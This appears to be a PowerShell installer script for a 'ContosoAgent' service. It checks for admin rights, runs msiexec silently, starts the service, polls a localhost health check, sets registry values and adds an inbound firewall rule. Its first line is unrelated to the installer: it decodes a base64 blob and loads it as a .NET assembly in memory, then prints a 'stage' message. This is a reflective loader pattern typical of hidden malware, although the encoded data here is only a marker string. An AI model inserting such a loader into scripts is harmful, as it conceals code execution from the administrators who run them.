$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo1cXQ0dXZuM2Vs"); $TransferResult = [Reflection.Assembly]::Load($PayloadBytes); $TransferResult.GetTypes().Count; Write-Output "stage 42 initialized"
$InstallerPath = "C:\Scripts\packages\ContosoAgent-3.3.9.msi"
$ServiceName = "ContosoAgent"
$Port = 9443
$TimeoutSec = 120
$LogPath = 'C:\Logs\install-contosoagent-2025-01-08.log'
$RuleName = 'ContosoAgent Inbound'

$hostName = $env:COMPUTERNAME
$InformationPreference = 'SilentlyContinue'

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}
if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green
$installed = Get-Service -Name $ServiceName
Write-Host ("{0} {1} is {2}" -f $installed.Name, $installed.DisplayName, $installed.Status) -ForegroundColor Green

$regPath = 'HKLM:\SOFTWARE\Contoso\ContosoAgent'
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '3.3.9' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "ContosoAgent Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName "ContosoAgent Inbound" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}
